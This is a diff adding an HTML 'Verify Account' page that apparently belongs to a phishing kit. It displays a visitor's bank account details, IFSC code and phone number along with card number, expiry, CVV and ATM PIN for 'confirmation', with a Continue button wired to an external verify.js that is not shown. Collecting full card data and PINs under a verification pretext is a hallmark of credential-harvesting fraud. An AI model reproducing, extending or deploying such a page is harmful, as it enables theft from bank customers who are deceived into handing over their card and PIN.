@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify Account</title>
+
+<link rel="stylesheet" href="verify.css">
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h1>🛡️ Verify Account</h1>
+
+<div class="card">
+
+<h2>Account Details</h2>
+
+<div class="row">
+<span>Bank Name</span>
+<b id="bankName"></b>
+</div>
+
+<div class="row">
+<span>Holder Name</span>
+<b id="holderName"></b>
+</div>
+
+<div class="row">
+<span>Account Number</span>
+<b id="accountNumber"></b>
+</div>
+
+<div class="row">
+<span>IFSC Code</span>
+<b id="ifsc"></b>
+</div>
+
+<div class="row">
+<span>Account Type</span>
+<b id="accountType"></b>
+</div>
+
+<div class="row">
+<span>Phone Number</span>
+<b id="phone"></b>
+</div>
+
+</div>
+
+<div class="card">
+
+<h2>ATM Details</h2>
+
+<div class="row">
+<span>Card Number</span>
+<b id="cardNumber"></b>
+</div>
+
+<div class="row">
+<span>Expiry</span>
+<b id="expiry"></b>
+</div>
+
+<div class="row">
+<span>CVV</span>
+<b id="cvv"></b>
+</div>
+
+<div class="row">
+<span>ATM PIN</span>
+<b id="pin"></b>
+</div>
+
+</div>
+
+<label class="agree">
+
+<input type="checkbox" id="agree">
+
+I confirm that all the above information is correct.
+
+</label>
+
+<button onclick="continueVerify()">
+
+Continue
+
+</button>
+
+</div>
+
+<div id="popup" class="popup">
+
+<div class="popupBox">
+
+<h2>Confirmation Required</h2>
+
+<p>Please confirm the information before continuing.</p>
+
+<button onclick="closePopup()">
+
+OK
+
+</button>
+
+</div>
+
+</div>
+
+<script src="verify.js"></script>
+
+</body>
+  </html>
